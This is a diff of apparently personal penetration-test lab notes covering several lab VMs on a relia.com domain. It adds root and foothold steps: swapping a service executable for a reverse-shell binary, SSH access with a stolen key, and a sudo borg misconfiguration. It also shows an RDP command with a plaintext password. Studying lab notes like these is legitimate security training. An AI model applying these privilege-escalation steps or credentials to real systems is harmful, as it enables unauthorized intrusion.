@@ -228,7 +228,7 @@ Host script results:
 |_clock-skew: mean: -1s, deviation: 0s, median: -1s
 ```
 
-# VM 6 .15
+# VM 6 .15 (pwned)
 - WK02
 ```
 PORT      STATE SERVICE       VERSION
@@ -275,8 +275,13 @@ Host script results:
 xfreerdp /v:172.16.197.15 /u:andrea /p:'PasswordPassword_6' /d:relia.com /cert-ignore
 ```
 
+## Root
+```
+    replacing rev shell exe to c:/updatecollector/updatecollctor.exe 
+```
+
 # VM 7 .19
-- ?
+- backup
 ```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -285,8 +290,26 @@ xfreerdp /v:172.16.197.15 /u:andrea /p:'PasswordPassword_6' /d:relia.com /cert-i
 |_  256 f2:94:b5:71:88:a1:f8:c5:d9:47:77:6b:07:ae:27:a0 (ED25519)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+## Foothold
+```
+    ssh sarah@172.16.140.20 -i backup-machine-ssh-sarah
+```
+
+## Root
+```
+User sarah may run the following commands on backup:
+    (ALL) NOPASSWD: /usr/bin/borg list *
+    (ALL) NOPASSWD: /usr/bin/borg extract *
+    (ALL) NOPASSWD: /usr/bin/borg mount *
+
+```
+```
+borg init --encryption=none /home/sarah/test
+
+```
 
 # VM 8 .20
+- production
 ```
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
